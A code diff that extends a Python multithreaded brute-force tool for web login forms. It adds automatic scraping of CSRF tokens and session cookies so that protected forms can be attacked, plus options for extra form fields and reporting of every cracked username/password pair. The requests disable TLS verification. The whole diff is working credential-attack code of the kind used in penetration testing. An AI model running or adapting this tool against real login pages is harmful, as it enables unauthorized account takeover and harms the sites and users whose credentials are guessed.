@@ -3,6 +3,7 @@ import requests
 import json
 from threading import Thread
 import time
+from bs4 import BeautifulSoup
 
 def listChunks(myList, numOfChunks):
     """ Yield successive n-sized chunks from myList."""
@@ -11,7 +12,7 @@ def listChunks(myList, numOfChunks):
         yield myList[i:i + numOfChunks]
 
 def BruteForce(url, usernameField, passwordField, postBool, getBool, jsonBool, dictionary, 
-                    provided_username, provided_password, check_value, 
+                    provided_username, provided_password, check_value, otherArgsList, csrfField,  
                     allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads):
     
     newDictionary = list(listChunks(dictionary, (len(dictionary) // numThreads)))
@@ -23,7 +24,8 @@ def BruteForce(url, usernameField, passwordField, postBool, getBool, jsonBool, d
         # We create a thread for each sublist and append it to the list of threads    
         listOfThreads.append(Thread(target=Requester, args=(url, provided_username,
                     provided_password,  sub_list, postBool, getBool, jsonBool, 
-                    allowRedirectsBool, correctValue, wrongValue, waitingTime, check_value, resultList)))
+                    allowRedirectsBool, correctValue, wrongValue, waitingTime, 
+                    check_value, otherArgsList, csrfField, resultList)))
     
     # Start the threads in the list
     for thread in listOfThreads:
@@ -33,18 +35,40 @@ def BruteForce(url, usernameField, passwordField, postBool, getBool, jsonBool, d
     for thread in listOfThreads:
         thread.join()
  
+    finalResults = ""
     # We check for a value that is diff from False 
     for each_element in resultList:
         if each_element != False:
-            finalResults = "The correct username/password combination is : " + each_element[usernameField] + "/" + each_element[passwordField]
-            return finalResults
+            finalResults += "The correct username/password combination is : " + each_element[usernameField] + "/" + each_element[passwordField] +"\n"
+    return finalResults
             
 
     return "No correct username/password combination was found"
 
+# A fucntion that obtains the CSRF Token and the Session correspondent with it
+def obtain_csrf_token_and_session(login_page_url, tag_name):
 
-def Requester(url, provided_username, provided_password, sub_list, postBool, getBool, jsonBool, allowRedirectsBool,
-                         correctValue, wrongValue, waitingTime, check_value, resultList):
+    r = requests.get(login_page_url)
+
+    page_content = BeautifulSoup(r.text, 'lxml')
+
+    # We find all the input tags in the page to search for the csrf element
+    all_tag_elements = page_content.find_all("input")
+
+    for each_tag in all_tag_elements:
+        # After finding the csrf element we get it's value
+        if each_tag.get('name') == tag_name:
+            csrf_token = each_tag.get('value')
+            break
+    
+    # We also obtain the cookies linked with the csrf generated
+    session_cookie = r.cookies.get_dict()
+
+    return csrf_token, session_cookie
+
+def Requester(url, provided_username, provided_password, sub_list, postBool, getBool, 
+                        jsonBool, allowRedirectsBool, correctValue, wrongValue, waitingTime,
+                        check_value, otherArgsList, csrfField, resultList):
     
     # We loop through each element in the sublist
     for each_element in sub_list:
@@ -60,6 +84,20 @@ def Requester(url, provided_username, provided_password, sub_list, postBool, get
         elif check_value == 2:
             data = {usernameField : provided_username, passwordField : provided_password}
 
+        # We check if the user added other arguments, so that we can add them to our data
+        if otherArgsList != None:
+            for each_arg in otherArgsList:
+                key = each_arg.split(':')[0]
+                value = each_arg.split(':')[1]
+                data[key] = value
+
+        session_cookie = {}
+
+        # If the user provided a csrf token tag name, we call the correspondent function
+        if csrfField != "":
+            csrf_token, session_cookie = obtain_csrf_token_and_session(url, csrfField)
+            data[csrfField] = csrf_token
+
         # Begin request generation
         if postBool:
             headers = {}
@@ -67,17 +105,19 @@ def Requester(url, provided_username, provided_password, sub_list, postBool, get
                 data = json.dumps(data)
                 headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
 
-            requestResult = requests.post(url, data=data, headers=headers, 
+            requestResult = requests.post(url, data=data, headers=headers, cookies=session_cookie, 
                         allow_redirects=allowRedirectsBool, verify=False)
 
         elif getBool:
-            requestResult = requests.get(url, params=data, 
+            requestResult = requests.get(url, params=data, cookies=session_cookie, 
                         allow_redirects=allowRedirectsBool, verify=False)
 
         # Waiting time between requests in seconds, provided by the user (Default = 0)
         time.sleep(waitingTime)
 
-        if ((correctValue in requestResult.text) and (wrongValue not in requestResult.text)):
+        requestResultText = requestResult.text
+
+        if ((correctValue in requestResultText) and (wrongValue not in requestResultText)):
             resultList.append(data)
         else:
             resultList.append(False)
@@ -126,6 +166,13 @@ if __name__ == "__main__":
     parser.add_argument('-passField', '--passwordField', dest='passwordField', required=True, 
                             help='The \'password\' as it is shown in the HTML name field')
 
+    parser.add_argument('-o', '--other', dest='otherArgs', nargs='*', 
+                        help='Other arguments that needs to be passed to request the page seperated by a semicolon \
+                        . For example if the arg is "login" and the value is "true" you pass - login:true')
+
+    parser.add_argument('-csrf', dest='csrfField', 
+                        help='If the page has a CSRF protection. Provide the name of the csrf field')
+
     parser.add_argument( '-t', '--threads', dest='numThreads', default=1, type=int, 
                         help='The number of threads to use (Default=1)')
 
@@ -166,6 +213,12 @@ if __name__ == "__main__":
     usernameField = args.usernameField
     passwordField = args.passwordField
 
+    # Getting other args if needed
+    otherArgsList = args.otherArgs
+
+    # Getting CSRF field name (as in the HTML) if there is a CSRF protection
+    csrfField = args.csrfField if args.csrfField != None else ""
+   
     # Getting information about HTTP verb method to use 
     postBool = args.postBool
     getBool = args.getBool
@@ -210,12 +263,12 @@ if __name__ == "__main__":
 
     # Constructor Definition
     # BruteForce(url, usernameField, passwordField, postBool, getBool, jsonBool, dictionary, 
-    #               provided_username, provided_password, check_value, 
+    #               provided_username, provided_password, check_value, otherArgsList, csrfField, 
     #               allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads)
 
     finalResults = BruteForce(url, usernameField, passwordField, postBool, getBool,
                      jsonBool, dictionary, provided_username, provided_password, 
-                    check_value, allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads)
+                    check_value, otherArgsList, csrfField, allowRedirectsBool, correctValue, wrongValue, waitingTime, numThreads)
 
     # We print the final resulsts (Combination of the correct user/pass) if there is one
     print(finalResults)
